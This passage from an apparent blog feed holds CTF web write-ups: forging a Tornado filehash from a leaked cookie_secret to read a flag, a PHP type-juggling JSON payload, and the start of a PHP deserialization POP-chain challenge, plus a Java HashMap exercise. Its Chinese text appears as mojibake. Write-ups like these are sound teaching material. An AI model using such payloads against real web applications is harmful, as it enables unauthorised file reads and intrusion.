<span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">#è½¬ä¸º16è¿›åˆ¶æ˜¾ç¤º</span><span class="token keyword">def</span> <span class="token function">filehash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span>    cookie_secret <span class="token operator">=</span> <span class="token string">'fa7d9694-aaa4-4a87-bd8e-76b2c8f5f010'</span>    <span class="token comment">#print(md5(cookie_secret+md5(filename)))</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret <span class="token operator">+</span> md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#é˜²æ­¢æ¨¡å—è¢«å¯¼å…¥åä¸‹æ–¹ä»£ç ä¹Ÿè¢«æ‰§è¡Œ</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    filehash<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload2ï¼š"><a href="#payload2ï¼š" class="headerlink" title="payload2ï¼š"></a>payload2ï¼š</h2><pre class="line-numbers language-none"><code class="language-none">ac815a16b2654d16425e58972575835e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="finally-payloadï¼š"><a href="#finally-payloadï¼š" class="headerlink" title="finally payloadï¼š"></a>finally payloadï¼š</h2><pre class="line-numbers language-none"><code class="language-none">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;ac815a16b2654d16425e58972575835e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°flagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206252230093.png" alt="image-20220625223037057"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a>æ€»ç»“:</h2><p>Python  tornado render æ¨¡æ¿æ³¨å…¥æ¼æ´</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">å‚è€ƒï¼šSSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title>å­—ç¬¦ä¸²å‹ç¼©</title>
    <link href="https://kannikanyun.github.io/2022/06/13/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9/"/>
    <id>https://kannikanyun.github.io/2022/06/13/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E7%BC%A9/</id>
    <published>2022-06-13T08:19:49.000Z</published>
    <updated>2022-06-17T05:33:09.081Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Java-HashMapä»‹ç»"><a href="#Java-HashMapä»‹ç»" class="headerlink" title="Java HashMapä»‹ç»"></a><a href="https://www.runoob.com/java/java-hashmap.html">Java HashMapä»‹ç»</a></h1><h1 id="intå’Œintegeræœ‰ä»€ä¹ˆåŒºåˆ«"><a href="#intå’Œintegeræœ‰ä»€ä¹ˆåŒºåˆ«" class="headerlink" title="intå’Œintegeræœ‰ä»€ä¹ˆåŒºåˆ«"></a><a href="https://blog.csdn.net/chenliguan/article/details/53888018">intå’Œintegeræœ‰ä»€ä¹ˆåŒºåˆ«</a></h1><h1 id="Java-HashMap-containsKey-æ–¹æ³•"><a href="#Java-HashMap-containsKey-æ–¹æ³•" class="headerlink" title="Java HashMap containsKey() æ–¹æ³• "></a><a href="https://www.runoob.com/java/java-hashmap-containskey.html">Java HashMap containsKey() æ–¹æ³• </a></h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">strSplit</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ZipStr</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// TODO è‡ªåŠ¨ç”Ÿæˆçš„æ–¹æ³•å­˜æ ¹</span><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"aabaaccdd"</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">fun1</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">HashMap</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Character</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Character</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> c <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//get()è·å–æŒ‡å®š key å¯¹åº”å¯¹ value</span><span class="token class-name">Integer</span> count <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å…³é”®ä»£ç ï¼šå¦‚æœc[i]å­˜å‚¨çš„å€¼ï¼ˆå¦‚æœæœ‰ç›¸ç­‰çš„å€¼ï¼Œvalueä¼šæ”¹å˜ï¼‰ç›¸ç­‰ï¼Œé‚£ä¹ˆcountä¹Ÿç›¸ç­‰</span><span class="token comment">//æ­¤å¤„çš„countçš„ç±»å‹ä¸€å®šè¦ä¸ºIntegerï¼Œå¦‚æœä¸ºintç±»å‹ï¼Œåˆ™countå€¼ä¸º0(Integerä¸ºä¸ºå¯¹è±¡å¼•ç”¨ï¼Œintä»…ä¸ºå€¼)</span><span class="token comment">//containsKey() æ£€æŸ¥ hashMap ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„ key å¯¹åº”çš„æ˜ å°„å…³ç³»ã€‚</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//å¦‚æœè¯¥å­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œåˆ™èµ‹valueä¸º1ï¼Œæ­¤åå¦‚æœå‡ºç°ç›¸åŒçš„å€¼ï¼ˆæŒ‡å‘çš„å¼•ç”¨æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯é”®å€¼å­˜åœ¨å¯¹åº”æ˜ å°„ï¼Œåˆ™æ‰§è¡Œelseï¼‰</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">//è·å–åˆ°æŒ‡å®šçš„ key(åˆ¤æ–­å€¼æ˜¯å¦å‡ºç°è¿‡ï¼Œå‡ºç°è¿‡åˆ™åŸå€¼+1) å¯¹åº”çš„æ˜ å°„å…³ç³»ã€‚</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤æ—¶çš„c[i]ä¸ä»£è¡¨ä¸‹æ ‡è€Œä»£è¡¨å€¼aÂ·Â·Â·</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> map<span class="token punctuation">;</span><span class="token comment">//è¿”å›çš„æ˜¯æ¯ç§å€¼åŠå¯¹åº”value</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//æ€è·¯ï¼š</span><span class="token comment">//1ã€å°†å­—ç¬¦ä¸²æ”¾åˆ°å­—ç¬¦æ•°ç»„ä¸­</span><span class="token comment">//2ã€å°†æ¯ä¸€ä¸ªå­—ç¬¦å…ƒç´ çš„å€¼æ”¾åˆ°Integerå¯¹è±¡ countä¸­</span><span class="token comment">//3ã€å¦‚æœè¯¥å­—ç¬¦ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œåˆ™value=1ï¼Œå¦‚æœå·²ç»å‡ºç°è¿‡ï¼Œåˆ™åœ¨ç¬¬ä¸€æ¬¡å‡ºç°çš„å€¼çš„valueä¸Š+1</span><span class="token comment">//4ã€è¿”å›map</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>isccMd</title>
    <link href="https://kannikanyun.github.io/2022/06/13/isccMd/"/>
    <id>https://kannikanyun.github.io/2022/06/13/isccMd/</id>
    <published>2022-06-13T08:17:47.000Z</published>
    <updated>2022-06-13T08:20:32.491Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token variable">$info</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Information'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// json_decode() å‡½æ•°ç”¨äºå¯¹ JSON æ ¼å¼çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ï¼Œå¹¶è½¬æ¢ä¸º PHP å˜é‡()</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2022</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//å¼±ç­‰äºï¼Œé€»è¾‘ä¸Šä¸å‰ä¸€ä¸ªæ¡ä»¶ï¼ˆè¦æ±‚yearå€¼ä¸ç­‰äºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼‰ç›¸åï¼Œæ—¢ç„¶æ˜¯å¼±ç­‰äºï¼Œé‚£ä¹ˆåˆ¤æ–­æœ‰2022å°±å¯ä»¥äº†ï¼Œpayloadå¯ä»¥åœ¨2022ååŠ ä»»æ„å­—ç¬¦éƒ½æ»¡è¶³</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//itemså€¼ä¸ºæ•°ç»„</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">OR</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">3</span> <span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¦æ±‚ä¸‹æ ‡ä¸º[1]çš„å…ƒç´ ä¸ºæ•°ç»„ï¼Œä¸”æ•´ä¸ªitemså‚æ•°é•¿åº¦ä¸º3</span>                <span class="token variable">$status</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"skiing"</span><span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åœ¨itemsä¸­æ£€ç´¢ï¼šè¿”å›items[i]é”®åœ¨æ•°ç»„ä¸­å¯¹åº”çš„å€¼ï¼Œä¸skiingè¿›è¡Œæ¯”è¾ƒï¼ˆå¼±ç­‰äºï¼Œä¹Ÿå°±æ˜¯0ä¸skiingæ¯”è¾ƒä¼šè¿”å›trueï¼‰</span>        <span class="token comment">//å­—ç¬¦æˆ–å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒä¼šå°†å½“ä¸€ä¸ªæ•°å­—ä¸ä¸€ä¸ªå­—ç¬¦ä¸²/å­—ç¬¦è¿›è¡Œå¤§å°æ¯”è¾ƒæ—¶ï¼Œé¦–å…ˆç³»ç»Ÿå°è¯•å°†æ­¤å­—ç¬¦ä¸²/å­—ç¬¦è½¬æ¢ä¸ºæ•´å‹/æµ®ç‚¹å‹ï¼Œç„¶åè¿›è¡Œæ¯”è¾ƒ</span>                <span class="token variable">$status</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span><span class="token comment">//è¦æ±‚statuså€¼ä¸ºtrueï¼Œå³itemsä¸­è¦æœ‰skiingå­—ç¬¦ä¸²</span>                <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//ç†è§£ï¼šä½¿ç”¨itemsä¸‹æ ‡ä½œä¸ºéå†æ¡ä»¶ï¼Œå¹¶å°†inemsä¸‹æ ‡ä½œä¸ºé”®ï¼Œå°†é”®å¯¹åº”çš„å€¼èµ‹å€¼ç»™$val</span>                        <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"skiing"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span><span class="token comment">//è¦æ±‚ï¼š$valä¸èƒ½å®Œå…¨ç­‰äºskiingï¼Œæç¤º</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Step1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$Step2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"2022flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> array(0) &#123; &#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¦æ±‚ï¼š"><a href="#è¦æ±‚ï¼š" class="headerlink" title="è¦æ±‚ï¼š"></a>è¦æ±‚ï¼š</h3><blockquote><ol><li>Informationä¼ å‚ä¸ºjsonæ ¼å¼</li><li>å‚æ•°ä¸­yearä¸ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</li><li>å‚æ•°itemsä¸ºæ•°ç»„ç±»å‹ï¼Œä¸”ä¸‹æ ‡ä¸º[1]çš„å…ƒç´ ä¸ºæ•°ç»„ï¼Œæ•´ä¸ªitemså‚æ•°é•¿åº¦ä¸º3</li><li>ä¾æ¬¡å°†itemsä¸­å…ƒç´ ä¸å­—ç¬¦ä¸²skiingè¿›è¡Œæ¯”è¾ƒï¼Œè¿”å›ç»“æœè¦æ±‚ä¸ºtrue</li><li>itemsä¸­å‚æ•°ä¸å®Œå…¨ç­‰äº(===)skiing</li></ol></blockquote><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p><code>?Information=&#123;&quot;year&quot;:&quot;2022asdf&quot;,&quot;items&quot;:[0,[1],0]&#125;</code></p><p>å‚è€ƒï¼š</p><p><a href="https://blog.csdn.net/weixin_34129696/article/details/91388238">PHPä¸­çš„æ•°å­—ä¸å­—ç¬¦ä¸²æ¯”è¾ƒ</a></p><p>array_search(â€œredâ€,$a)å‡½æ•°</p><blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java">åœ¨æ•°ç»„ä¸­æœç´¢é”®å€¼ <span class="token string">"red"</span>ï¼Œå¹¶è¿”å›å®ƒçš„é”®åï¼š<span class="token operator">&lt;</span><span class="token operator">?</span>php$a<span class="token operator">=</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"green"</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"blue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>echo <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">,</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="1ã€ç¯å¢ƒ"><a href="#1ã€ç¯å¢ƒ" class="headerlink" title="1ã€ç¯å¢ƒ"></a>1ã€ç¯å¢ƒ</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">Happy New Year~ MAKE A WISH<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Happy New Year~ MAKE A WISH&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'wish'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¯¹ä¼ å‚wishè¿›è¡Œååºåˆ—åŒ–</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/***************************pop your 2022*****************************/</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Road_is_Long</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$page</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//å¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token comment">//å½“å‰å¯¹è±¡æŒ‡å‘pageå˜é‡ï¼Œpageå˜é‡èµ‹å€¼ä¸º$fileçš„å€¼(è§¦å‘__toString())</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">;</span><span class="token comment">//è¿”å›page(file=&lt;ç±»è¢«å®ä¾‹åŒ–æ—¶ä¼ å…¥çš„å€¼>)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|ftp|http|https|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//åœ¨åˆ›å»ºRoad_is_Longå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨__wakeup()ï¼Œå‚æ•°ä¸åŒ…å«è¿™äº›å…³é”®å­—å°±å¯ä»¥ç»•è¿‡</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can Not Enter 2022"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Try_Work_Hard</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span><span class="token comment">//æ–‡ä»¶åŒ…å«çš„å˜é‡æ‰€æŒ‡å‘çš„å€¼</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Make_a_Change</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$effort</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">effort</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 